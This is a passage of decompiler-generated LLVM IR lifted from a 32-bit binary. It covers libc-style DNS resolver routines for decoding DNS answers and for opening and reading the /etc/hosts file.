dec_label_pc_8058231:                             ; preds = %entry, %dec_label_pc_805820d, %dec_label_pc_8058212
  %v0_8058232 = phi i32 [ %v8_80581f8, %entry ], [ -1, %dec_label_pc_805820d ], [ %v0_8058232.pre, %dec_label_pc_8058212 ]
  %v2_8058231 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8058231, i32* @ebx, align 4
  store i32 %v0_80581e4, i32* @edi, align 4
  ret i32 %v0_8058232

; uselistorder directives
  uselistorder i32 %v1_8058208, { 1, 0 }
  uselistorder i32 %v2_8058206, { 0, 2, 1 }
  uselistorder i32 %v8_80581f8, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 3, 2, 1, 8, 4, 5, 6, 0, 7 }
  uselistorder label %dec_label_pc_8058231, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v2_8058243 = call i32 @__length_dotted(i32 %tmp, i32 %tmp1)
  %v2_8058248 = icmp slt i32 %v2_8058243, 0
  %v1_805824a = add i32 %v2_8058243, 4
  %v1_805824d = icmp eq i1 %v2_8058248, false
  %v4_805824d = select i1 %v1_805824d, i32 %v1_805824a, i32 %v2_8058243
  ret i32 %v4_805824d

; uselistorder directives
  uselistorder i32 %v2_8058243, { 1, 0, 2 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8058254 = load i32, i32* @ebp, align 4
  %v0_8058255 = load i32, i32* @edi, align 4
  %v0_8058256 = load i32, i32* @esi, align 4
  %v0_8058257 = load i32, i32* @ebx, align 4
  store i32 %v0_8058257, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8058278 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8058278, i32* %eax.global-to-local, align 4
  %v4_8058285 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_8058278, i32 256)
  store i32 %v4_8058285, i32* %eax.global-to-local, align 4
  %v3_805828d = icmp slt i32 %v4_8058285, 0
  store i32 %v4_8058285, i32* @edi, align 4
  br i1 %v3_805828d, label %dec_label_pc_8058340, label %dec_label_pc_8058297

dec_label_pc_8058297:                             ; preds = %entry
  %v0_8058297 = load i32, i32* @ebx, align 4
  %v3_8058297 = add i32 %v0_8058297, %v4_8058285
  %v0_8058299 = load i32, i32* @esi, align 4
  %v2_8058299 = sub i32 %v0_8058299, %v3_8058297
  %v1_805829b = add i32 %v2_8058299, -10
  %v10_805829b = icmp slt i32 %v1_805829b, 0
  store i32 %v1_805829b, i32* @esi, align 4
  %v1_80582a6 = icmp eq i1 %v10_805829b, false
  br i1 %v1_80582a6, label %dec_label_pc_80582af, label %dec_label_pc_80582a8

dec_label_pc_80582a8:                             ; preds = %dec_label_pc_8058297
  br label %dec_label_pc_8058340

dec_label_pc_80582af:                             ; preds = %dec_label_pc_8058297
  %v6_80582b6 = add i32 %v3_8058297, %tmp4
  store i32 %v6_80582b6, i32* @ebx, align 4
  store i32 %v2_8058278, i32* %eax.global-to-local, align 4
  %v1_80582c2 = bitcast i32* %stack_var_-272 to i8*
  %v2_80582c2 = call i32 @__GI_strdup(i8* %v1_80582c2)
  store i32 %v2_80582c2, i32* %eax.global-to-local, align 4
  %v0_80582c7 = load i32, i32* @ebx, align 4
  %v1_80582c7 = add i32 %v0_80582c7, 4
  store i32 %v1_80582c7, i32* %esi.global-to-local, align 4
  %v1_80582ca = load i32, i32* @ebp, align 4
  %v2_80582ca = inttoptr i32 %v1_80582ca to i32*
  store i32 %v2_80582c2, i32* %v2_80582ca, align 4
  %v0_80582cd = load i32, i32* @ebx, align 4
  %v1_80582cd = inttoptr i32 %v0_80582cd to i8*
  %v2_80582cd = load i8, i8* %v1_80582cd, align 1
  %v3_80582cd = zext i8 %v2_80582cd to i32
  store i32 %v3_80582cd, i32* %eax.global-to-local, align 4
  %v1_80582d0 = add i32 %v0_80582cd, 1
  %v2_80582d0 = inttoptr i32 %v1_80582d0 to i8*
  %v3_80582d0 = load i8, i8* %v2_80582d0, align 1
  %v4_80582d0 = zext i8 %v3_80582d0 to i32
  store i32 %v4_80582d0, i32* %edx.global-to-local, align 4
  %v2_80582d4 = mul nuw nsw i32 %v3_80582cd, 256
  %v2_80582d7 = or i32 %v4_80582d0, %v2_80582d4
  store i32 %v2_80582d7, i32* %eax.global-to-local, align 4
  %v1_80582d9 = load i32, i32* @ebp, align 4
  %v2_80582d9 = add i32 %v1_80582d9, 4
  %v3_80582d9 = inttoptr i32 %v2_80582d9 to i32*
  store i32 %v2_80582d7, i32* %v3_80582d9, align 4
  %v0_80582dc = load i32, i32* @ebx, align 4
  %v1_80582dc = add i32 %v0_80582dc, 2
  %v2_80582dc = inttoptr i32 %v1_80582dc to i8*
  %v3_80582dc = load i8, i8* %v2_80582dc, align 1
  %v4_80582dc = zext i8 %v3_80582dc to i32
  store i32 %v4_80582dc, i32* %eax.global-to-local, align 4
  %v1_80582e0 = add i32 %v0_80582dc, 3
  %v2_80582e0 = inttoptr i32 %v1_80582e0 to i8*
  %v3_80582e0 = load i8, i8* %v2_80582e0, align 1
  %v4_80582e0 = zext i8 %v3_80582e0 to i32
  store i32 %v4_80582e0, i32* %edx.global-to-local, align 4
  %v2_80582e4 = mul nuw nsw i32 %v4_80582dc, 256
  %v2_80582e7 = or i32 %v4_80582e0, %v2_80582e4
  store i32 %v2_80582e7, i32* %eax.global-to-local, align 4
  %v1_80582e9 = load i32, i32* @ebp, align 4
  %v2_80582e9 = add i32 %v1_80582e9, 8
  %v3_80582e9 = inttoptr i32 %v2_80582e9 to i32*
  store i32 %v2_80582e7, i32* %v3_80582e9, align 4
  %v0_80582ec = load i32, i32* @ebx, align 4
  %v1_80582ec = add i32 %v0_80582ec, 4
  %v2_80582ec = inttoptr i32 %v1_80582ec to i8*
  %v3_80582ec = load i8, i8* %v2_80582ec, align 1
  %v4_80582ec = zext i8 %v3_80582ec to i32
  store i32 %v4_80582ec, i32* %edx.global-to-local, align 4
  %v0_80582f0 = load i32, i32* %esi.global-to-local, align 4
  %v1_80582f0 = add i32 %v0_80582f0, 1
  %v2_80582f0 = inttoptr i32 %v1_80582f0 to i8*
  %v3_80582f0 = load i8, i8* %v2_80582f0, align 1
  %v4_80582f0 = zext i8 %v3_80582f0 to i32
  store i32 %v4_80582f0, i32* %eax.global-to-local, align 4
  %v1_80582f4 = add i32 %v0_80582f0, 2
  %v2_80582f4 = inttoptr i32 %v1_80582f4 to i8*
  %v3_80582f4 = load i8, i8* %v2_80582f4, align 1
  %v4_80582f4 = zext i8 %v3_80582f4 to i32
  %v2_80582f8 = mul nuw i32 %v4_80582ec, 16777216
  %v2_80582fb = mul nuw nsw i32 %v4_80582f0, 65536
  store i32 %v2_80582fb, i32* %eax.global-to-local, align 4
  %v2_80582fe = or i32 %v2_80582fb, %v2_80582f8
  store i32 %v2_80582fe, i32* %edx.global-to-local, align 4
  %v1_8058300 = add i32 %v0_80582f0, 3
  %v2_8058300 = inttoptr i32 %v1_8058300 to i8*
  %v3_8058300 = load i8, i8* %v2_8058300, align 1
  %v4_8058300 = zext i8 %v3_8058300 to i32
  store i32 %v4_8058300, i32* %eax.global-to-local, align 4
  %v2_8058304 = mul nuw nsw i32 %v4_80582f4, 256
  %v2_8058307 = or i32 %v4_8058300, %v2_80582fe
  store i32 %v2_8058307, i32* %edx.global-to-local, align 4
  %v2_8058309 = or i32 %v2_8058307, %v2_8058304
  store i32 %v2_8058309, i32* @ecx, align 4
  %v1_805830b = load i32, i32* @ebp, align 4
  %v2_805830b = add i32 %v1_805830b, 12
  %v3_805830b = inttoptr i32 %v2_805830b to i32*
  store i32 %v2_8058309, i32* %v3_805830b, align 4
  %v0_805830e = load i32, i32* @ebx, align 4
  %v1_805830e = add i32 %v0_805830e, 8
  %v2_805830e = inttoptr i32 %v1_805830e to i8*
  %v3_805830e = load i8, i8* %v2_805830e, align 1
  %v4_805830e = zext i8 %v3_805830e to i32
  store i32 %v4_805830e, i32* %edx.global-to-local, align 4
  %v1_8058312 = add i32 %v0_805830e, 9
  %v2_8058312 = inttoptr i32 %v1_8058312 to i8*
  %v3_8058312 = load i8, i8* %v2_8058312, align 1
  %v4_8058312 = zext i8 %v3_8058312 to i32
  store i32 %v4_8058312, i32* %eax.global-to-local, align 4
  %v1_8058316 = add i32 %v0_805830e, 10
  %v1_8058319 = load i32, i32* @ebp, align 4
  %v2_8058319 = add i32 %v1_8058319, 20
  %v3_8058319 = inttoptr i32 %v2_8058319 to i32*
  store i32 %v1_8058316, i32* %v3_8058319, align 4
  %v0_805831c = load i32, i32* %edx.global-to-local, align 4
  %v2_805831c = mul i32 %v0_805831c, 256
  %v1_805831f = load i32, i32* %eax.global-to-local, align 4
  %v2_805831f = or i32 %v1_805831f, %v2_805831c
  store i32 %v2_805831f, i32* @edx, align 4
  %v1_8058321 = load i32, i32* @ebp, align 4
  %v2_8058321 = add i32 %v1_8058321, 16
  %v3_8058321 = inttoptr i32 %v2_8058321 to i32*
  store i32 %v2_805831f, i32* %v3_8058321, align 4
  %v1_805832b = add i32 %v3_8058297, 10
  store i32 %v1_805832b, i32* %eax.global-to-local, align 4
  %v1_805832e = load i32, i32* @ebp, align 4
  %v2_805832e = add i32 %v1_805832e, 24
  %v3_805832e = inttoptr i32 %v2_805832e to i32*
  store i32 %v1_805832b, i32* %v3_805832e, align 4
  %v4_8058331 = load i32, i32* @edx, align 4
  %v5_8058335 = icmp slt i32 %v1_805829b, %v4_8058331
  br i1 %v5_8058335, label %dec_label_pc_8058337, label %dec_label_pc_805833c

dec_label_pc_8058337:                             ; preds = %dec_label_pc_80582af
  br label %dec_label_pc_8058340

dec_label_pc_805833c:                             ; preds = %dec_label_pc_80582af
  %v1_805833c = load i32, i32* @edi, align 4
  %v2_805833c = add i32 %v4_8058331, 10
  %v3_805833c = add i32 %v2_805833c, %v1_805833c
  br label %dec_label_pc_8058340

dec_label_pc_8058340:                             ; preds = %entry, %dec_label_pc_8058337, %dec_label_pc_80582a8, %dec_label_pc_805833c
  %v0_8058346 = phi i32 [ %v4_8058285, %entry ], [ -1, %dec_label_pc_8058337 ], [ %v1_805829b, %dec_label_pc_80582a8 ], [ %v3_805833c, %dec_label_pc_805833c ]
  store i32 %v0_8058346, i32* %eax.global-to-local, align 4
  %v2_8058348 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8058348, i32* @ebx, align 4
  store i32 %v0_8058256, i32* @esi, align 4
  store i32 %v0_8058255, i32* @edi, align 4
  store i32 %v0_8058254, i32* @ebp, align 4
  ret i32 %v0_8058346

; uselistorder directives
  uselistorder i32 %v0_8058346, { 1, 0 }
  uselistorder i32 %v2_80582fb, { 1, 0 }
  uselistorder i32 %v1_805829b, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8058297, { 1, 0, 2 }
  uselistorder i32 %v4_8058285, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_8058278, { 1, 0, 2 }
  uselistorder i32 16777216, { 0, 1, 3, 2, 5, 4, 7, 6, 9, 8, 11, 10 }
  uselistorder i32 3, { 62, 63, 64, 65, 66, 67, 22, 0, 13, 1, 23, 2, 18, 68, 3, 69, 24, 5, 4, 6, 11, 12, 10, 25, 14, 26, 51, 21, 52, 35, 36, 37, 38, 39, 40, 70, 19, 20, 41, 27, 16, 17, 7, 33, 55, 32, 56, 31, 57, 30, 58, 29, 59, 42, 28, 43, 60, 61, 44, 45, 46, 47, 9, 53, 54, 8, 34, 48, 49, 50, 15 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8058340, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_805835d = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_805d4a5.599 to i32), i32 ptrtoint (i32* @global_var_805d470.584 to i32))
  store i32 %v3_805835d, i32* @eax, align 4
  %v1_8058365 = icmp eq i32 %v3_805835d, 0
  %v1_8058367 = icmp eq i1 %v1_8058365, false
  br i1 %v1_8058367, label %dec_label_pc_805837d, label %dec_label_pc_8058369

dec_label_pc_8058369:                             ; preds = %entry
  %v3_8058375 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_805d4b0.600 to i32), i32 ptrtoint (i32* @global_var_805d470.584 to i32))
  br label %dec_label_pc_805837d

dec_label_pc_805837d:                             ; preds = %entry, %dec_label_pc_8058369
  %v0_8058380 = phi i32 [ %v3_805835d, %entry ], [ %v3_8058375, %dec_label_pc_8058369 ]
  ret i32 %v0_8058380

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_805d470.584 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_805837d, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp60 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_8058381 = load i32, i32* @ebp, align 4
  %v0_8058382 = load i32, i32* @edi, align 4
  %v0_8058383 = load i32, i32* @esi, align 4
  %v0_8058384 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_8058392 = sub i32 0, %arg6
  %v1_8058394 = urem i32 %v1_8058392, 4
  %v2_8058394 = icmp eq i32 %v1_8058394, 0
  store i32 %v1_8058394, i32* %eax.global-to-local, align 4
  br i1 %v2_8058394, label %dec_label_pc_80583a5, label %dec_label_pc_8058399

dec_label_pc_8058399:                             ; preds = %entry
  %v2_8058399 = sub i32 %arg7, %v1_8058394
  %v7_8058399 = icmp ugt i32 %v1_8058394, %arg7
  br i1 %v7_8058399, label %dec_label_pc_8058649, label %dec_label_pc_80583a1

dec_label_pc_80583a1:                             ; preds = %dec_label_pc_8058399
  %v2_80583a1 = add i32 %v1_8058394, %arg6
  store i32 %v2_80583a1, i32* @ebx, align 4
  store i32 %v2_8058399, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80583a5

dec_label_pc_80583a5:                             ; preds = %entry, %dec_label_pc_80583a1
  %v0_80583b3 = phi i32 [ %arg6, %entry ], [ %v2_80583a1, %dec_label_pc_80583a1 ]
  %v0_80583ba = phi i32 [ %arg7, %entry ], [ %v2_8058399, %dec_label_pc_80583a1 ]
  %tmp = icmp ult i32 %v0_80583ba, 32
  br i1 %tmp, label %dec_label_pc_8058649, label %dec_label_pc_80583ae

dec_label_pc_80583ae:                             ; preds = %dec_label_pc_80583a5
  %v12_80583ae = icmp eq i32 %arg4, 1
  %v1_80583b3 = add i32 %v0_80583b3, 32
  store i32 %v1_80583b3, i32* %eax.global-to-local, align 4
  %v1_80583ba = add i32 %v0_80583ba, -32
  store i32 %v1_80583ba, i32* @ebp, align 4
  br i1 %v12_80583ae, label %dec_label_pc_80583ae.dec_label_pc_80584f9_crit_edge, label %dec_label_pc_80583c3

dec_label_pc_80583ae.dec_label_pc_80584f9_crit_edge: ; preds = %dec_label_pc_80583ae
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_80584f9

dec_label_pc_80583c3:                             ; preds = %dec_label_pc_80583ae
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_80583ca = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_80583ca, align 4
  %tmp144 = icmp ult i32 %v1_80583ba, 4
  br i1 %tmp144, label %dec_label_pc_8058649, label %dec_label_pc_80583d6

dec_label_pc_80583d6:                             ; preds = %dec_label_pc_80583c3
  %v0_80583d6 = load i32, i32* %edx.global-to-local, align 4
  %v1_80583d6 = add i32 %v0_80583d6, -36
  store i32 %v1_80583d6, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ult i32 %v1_80583d6, 8
  br i1 %tmp145, label %dec_label_pc_8058649, label %dec_label_pc_80583e2

dec_label_pc_80583e2:                             ; preds = %dec_label_pc_80583d6
  %v0_80583e2 = load i32, i32* @ebp, align 4
  %tmp146 = icmp ult i32 %v0_80583e2, 16
  br i1 %tmp146, label %dec_label_pc_8058649, label %dec_label_pc_80583eb

dec_label_pc_80583eb:                             ; preds = %dec_label_pc_80583e2
  %v1_80583eb = add i32 %v0_80583d6, -48
  store i32 %v1_80583eb, i32* %eax.global-to-local, align 4
  %tmp147 = icmp ult i32 %v1_80583eb, 8
  br i1 %tmp147, label %dec_label_pc_8058649, label %dec_label_pc_80583f7

dec_label_pc_80583f7:                             ; preds = %dec_label_pc_80583eb
  %v0_80583f7 = load i32, i32* @ebx, align 4
  %v1_80583f7 = add i32 %v0_80583f7, 48
  %v1_80583fa = add i32 %v0_80583d6, -44
  store i32 %v1_80583fa, i32* @ebp, align 4
  %v1_8058401 = add i32 %v0_80583d6, -56
  store i32 %v1_8058401, i32* @eax, align 4
  %v7_8058404 = icmp ult i32 %v1_8058401, %v1_80583fa
  %v1_8058406 = add i32 %v0_80583f7, 36
  store i32 %v1_8058406, i32* @edi, align 4
  br i1 %v7_8058404, label %dec_label_pc_8058410, label %dec_label_pc_805840b

dec_label_pc_805840b:                             ; preds = %dec_label_pc_80583f7
  %v1_805840b = add i32 %v0_80583f7, 44
  store i32 %v1_805840b, i32* @esi, align 4
  br label %dec_label_pc_8058415

dec_label_pc_8058410:                             ; preds = %dec_label_pc_80583f7
  %v1_8058410 = add i32 %v0_80583f7, 56
  store i32 %v1_8058410, i32* @esi, align 4
  store i32 %v1_8058401, i32* @ebp, align 4
  br label %dec_label_pc_8058415

dec_label_pc_8058415:                             ; preds = %dec_label_pc_805840b, %dec_label_pc_8058410
  %v0_8058415 = phi i32 [ %v1_80583fa, %dec_label_pc_805840b ], [ %v1_8058401, %dec_label_pc_8058410 ]
  %tmp148 = icmp ult i32 %v0_8058415, 80
  br i1 %tmp148, label %dec_label_pc_8058649, label %dec_label_pc_805841e

dec_label_pc_805841e:                             ; preds = %dec_label_pc_8058415
  %v0_805841e = call i32 @__open_etc_hosts()
  store i32 %v0_805841e, i32* %eax.global-to-local, align 4
  %v1_8058423 = icmp eq i32 %v0_805841e, 0
  br i1 %v1_8058423, label %dec_label_pc_805844b, label %dec_label_pc_805842b

dec_label_pc_805842b:                             ; preds = %dec_label_pc_805841e
  store i32 %v1_80583b3, i32* %edx.global-to-local, align 4
  store i32 %v1_80583f7, i32* %eax.global-to-local, align 4
  %v0_8058433 = load i32, i32* @edi, align 4
  %v0_8058437 = load i32, i32* @esi, align 4
  %v4_805843b = inttoptr i32 %v1_80583b3 to i8*
  br label %dec_label_pc_80584f9

dec_label_pc_805844b:                             ; preds = %dec_label_pc_805841e
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_805844f = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_805844f, align 4
  %v1_8058455 = call i32 @__errno_location(i32 0)
  store i32 %v1_8058455, i32* %eax.global-to-local, align 4
  %v1_805845a = inttoptr i32 %v1_8058455 to i32*
  %v2_805845a = load i32, i32* %v1_805845a, align 4
  store i32 %v2_805845a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058649

dec_label_pc_8058465:                             ; preds = %dec_label_pc_80585cc
  %v2_8058465 = load i8*, i8** %stack_var_-44, align 4
  %v3_8058465 = ptrtoint i8* %v2_8058465 to i32
  store i32 %v3_8058465, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_805846c = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_8058465, i32* %v2_805846c, align 4
  %v0_805846e = load i32, i32* %eax.global-to-local, align 4
  %v1_805846e = add i32 %v0_805846e, 4
  %v2_805846e = inttoptr i32 %v1_805846e to i32*
  store i32 0, i32* %v2_805846e, align 4
  %v0_8058475 = load i32, i32* @ebx, align 4
  %v1_8058475 = add i32 %v0_8058475, 4
  %v2_8058475 = inttoptr i32 %v1_8058475 to i32*
  %v3_8058475 = load i32, i32* %v2_8058475, align 4
  store i32 %v3_8058475, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_8058475, i32* %arg5, align 4
  %v1_805847e = add i32 %tmp60, 8
  %v2_805847e = inttoptr i32 %v1_805847e to i32*
  store i32 2, i32* %v2_805847e, align 4
  %v0_8058485 = load i32, i32* %edx.global-to-local, align 4
  %v1_8058485 = add i32 %v0_8058485, 12
  %v2_8058485 = inttoptr i32 %v1_8058485 to i32*
  store i32 4, i32* %v2_8058485, align 4
  br label %dec_label_pc_80584be

dec_label_pc_8058492:                             ; preds = %dec_label_pc_80585ee
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v2_805849a = inttoptr i32 %storemerge3 to i32*
  store i32 %stack_var_-36.0, i32* %v2_805849a, align 4
  %v0_805849c = load i32, i32* %edx.global-to-local, align 4
  %v1_805849c = add i32 %v0_805849c, 4
  %v2_805849c = inttoptr i32 %v1_805849c to i32*
  store i32 0, i32* %v2_805849c, align 4
  %v0_80584a3 = load i32, i32* @ebx, align 4
  %v1_80584a3 = add i32 %v0_80584a3, 4
  %v2_80584a3 = inttoptr i32 %v1_80584a3 to i32*
  %v3_80584a3 = load i32, i32* %v2_80584a3, align 4
  store i32 %v3_80584a3, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_80584a3, i32* %arg5, align 4
  %v1_80584ac = add i32 %tmp60, 8
  %v2_80584ac = inttoptr i32 %v1_80584ac to i32*
  store i32 10, i32* %v2_80584ac, align 4
  %v0_80584b3 = load i32, i32* %edx.global-to-local, align 4
  %v1_80584b3 = add i32 %v0_80584b3, 12
  %v2_80584b3 = inttoptr i32 %v1_80584b3 to i32*
  store i32 16, i32* %v2_80584b3, align 4
  br label %dec_label_pc_80584be

dec_label_pc_80584be:                             ; preds = %dec_label_pc_8058465, %dec_label_pc_8058492
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8058465 ], [ %storemerge3, %dec_label_pc_8058492 ]
  %v1_80584be = load i32, i32* %edx.global-to-local, align 4
  %v2_80584be = add i32 %v1_80584be, 16
  %v3_80584be = inttoptr i32 %v2_80584be to i32*
  store i32 %storemerge, i32* %v3_80584be, align 4
  %v0_80584c1 = load i32, i32* @ebx, align 4
  %v1_80584c1 = add i32 %v0_80584c1, 8
  %v1_80584c4 = load i32, i32* %edx.global-to-local, align 4
  %v2_80584c4 = add i32 %v1_80584c4, 4
  %v3_80584c4 = inttoptr i32 %v2_80584c4 to i32*
  store i32 %v1_80584c1, i32* %v3_80584c4, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_80584cb = load i32, i32* %edx.global-to-local, align 4
  %v2_80584cb = inttoptr i32 %arg8 to i32*
  store i32 %v0_80584cb, i32* %v2_80584cb, align 4
  br label %dec_label_pc_8058629

dec_label_pc_80584f9:                             ; preds = %dec_label_pc_80583ae.dec_label_pc_80584f9_crit_edge, %dec_label_pc_805842b
  %v1_80584fd.pre-phi = phi i32* [ %.pre, %dec_label_pc_80583ae.dec_label_pc_80584f9_crit_edge ], [ %v1_80583ca, %dec_label_pc_805842b ]
  %storemerge4 = phi i8* [ null, %dec_label_pc_80583ae.dec_label_pc_80584f9_crit_edge ], [ %v4_805843b, %dec_label_pc_805842b ]
  %stack_var_-20.0.in = phi i32 [ %v1_80583b3, %dec_label_pc_80583ae.dec_label_pc_80584f9_crit_edge ], [ %v0_8058437, %dec_label_pc_805842b ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_80583ae.dec_label_pc_80584f9_crit_edge ], [ %v1_80583b3, %dec_label_pc_805842b ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_80583ae.dec_label_pc_80584f9_crit_edge ], [ %v0_8058433, %dec_label_pc_805842b ]
  %stack_var_4.0 = phi i32 [ %arg1, %dec_label_pc_80583ae.dec_label_pc_80584f9_crit_edge ], [ %v0_805841e, %dec_label_pc_805842b ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_80583ae.dec_label_pc_80584f9_crit_edge ], [ %v1_80583f7, %dec_label_pc_805842b ]
  store i8* %storemerge4, i8** %stack_var_-44, align 4
  %stack_var_-20.0 = inttoptr i32 %stack_var_-20.0.in to i8*
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_80584fd.pre-phi, align 4
  %v12_8058587 = icmp eq i32 %arg4, 2
  %v4_80585b2 = inttoptr i32 %arg2 to i8*
  %v12_80585c5 = icmp eq i32 %arg3, 2
  %v12_80585e7 = icmp eq i32 %arg3, 10
  %v1_8058591 = icmp eq i1 %v12_8058587, false
  %v1_80585ca = icmp eq i1 %v12_80585c5, false
  %v1_80585ec = icmp eq i1 %v12_80585e7, false
  br label %dec_label_pc_805860f.outer

dec_label_pc_805860f.outer:                       ; preds = %dec_label_pc_80585e7, %dec_label_pc_80585ee, %dec_label_pc_80585cc, %dec_label_pc_80584f9
  %stack_var_-28.0.ph = phi i32 [ 1, %dec_label_pc_80584f9 ], [ 2, %dec_label_pc_80585cc ], [ 2, %dec_label_pc_80585ee ], [ 2, %dec_label_pc_80585e7 ]
  br label %dec_label_pc_805860f

dec_label_pc_8058510:                             ; preds = %dec_label_pc_805860f
  %v3_8058518 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_8058518, i32* @eax, align 4
  %v1_8058520 = icmp eq i32 %v3_8058518, 0
  br i1 %v1_8058520, label %dec_label_pc_8058527, label %dec_label_pc_8058524

dec_label_pc_8058524:                             ; preds = %dec_label_pc_8058510
  %v1_8058524 = inttoptr i32 %v3_8058518 to i8*
  store i8 0, i8* %v1_8058524, align 1
  br label %dec_label_pc_8058527

dec_label_pc_8058527:                             ; preds = %dec_label_pc_8058510, %dec_label_pc_8058524
  store i32 %stack_var_-20.0.in, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_805856734 = load i8, i8* %stack_var_-20.0, align 1
  %v3_805856735 = icmp eq i8 %v2_805856734, 0
  %v1_805856a41 = icmp eq i1 %v3_805856735, false
  br i1 %v1_805856a41, label %dec_label_pc_8058533.preheader.preheader, label %dec_label_pc_805856c

dec_label_pc_8058533.preheader.preheader:         ; preds = %dec_label_pc_8058527
  %v4_805853398.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8058533.preheader

dec_label_pc_805852f:                             ; preds = %dec_label_pc_8058539
  store i8 0, i8* %v1_8058533104, align 1
  %v0_8058532 = load i32, i32* @ecx, align 4
  %v1_8058532 = add i32 %v0_8058532, 1
  store i32 %v1_8058532, i32* @ecx, align 4
  %v1_8058533 = inttoptr i32 %v1_8058532 to i8*
  %v2_8058533 = load i8, i8* %v1_8058533, align 1
  %v3_8058533 = zext i8 %v2_8058533 to i32
  %v4_8058533 = load i32, i32* %eax.global-to-local, align 4
  %v5_8058533 = and i32 %v4_8058533, -256
  %v6_8058533 = or i32 %v5_8058533, %v3_8058533
  store i32 %v6_8058533, i32* @eax, align 4
  %v4_8058535 = icmp eq i8 %v2_8058533, 0
  br i1 %v4_8058535, label %dec_label_pc_8058533.dec_label_pc_805856c.loopexit_crit_edge, label %dec_label_pc_8058539

dec_label_pc_8058539:                             ; preds = %dec_label_pc_8058533.preheader, %dec_label_pc_805852f
  %v2_8058533105 = phi i8 [ %v2_8058533, %dec_label_pc_805852f ], [ %v2_805853396, %dec_label_pc_8058533.preheader ]
  %v1_8058533104 = phi i8* [ %v1_8058533, %dec_label_pc_805852f ], [ %v1_805853395, %dec_label_pc_8058533.preheader ]
  %v0_805852f103 = phi i32 [ %v1_8058532, %dec_label_pc_805852f ], [ %v0_805853349, %dec_label_pc_8058533.preheader ]
  %v2_8058539 = sext i8 %v2_8058533105 to i32
  store i32 %v2_8058539, i32* @edx, align 4
  %v0_805853c = load i32, i32* @global_var_805e1e8, align 8
  store i32 %v0_805853c, i32* %eax.global-to-local, align 4
  %v2_8058541 = mul nsw i32 %v2_8058539, 2
  %v3_8058541 = add i32 %v0_805853c, %v2_8058541
  %v4_8058541 = inttoptr i32 %v3_8058541 to i8*
  %v5_8058541 = load i8, i8* %v4_8058541, align 1
  %v6_8058541 = and i8 %v5_8058541, 32
  %v7_8058541 = icmp eq i8 %v6_8058541, 0
  %v1_8058545 = icmp eq i1 %v7_8058541, false
  br i1 %v1_8058545, label %dec_label_pc_805852f, label %dec_label_pc_8058547

dec_label_pc_8058547:                             ; preds = %dec_label_pc_8058539
  %v0_8058547 = load i32, i32* @edi, align 4
  %v1_8058547 = add i32 %v0_8058547, -6
  %v6_8058547 = sub i32 5, %v0_8058547
  %v7_8058547 = and i32 %v6_8058547, %v0_8058547
  %v8_8058547 = icmp slt i32 %v7_8058547, 0
  %v9_8058547 = icmp eq i32 %v1_8058547, 0
  %v10_8058547 = icmp slt i32 %v1_8058547, 0
  %v3_805854a = icmp eq i1 %v10_8058547, %v8_8058547
  %v4_805854a = icmp eq i1 %v9_8058547, false
  %v5_805854a = and i1 %v4_805854a, %v3_805854a
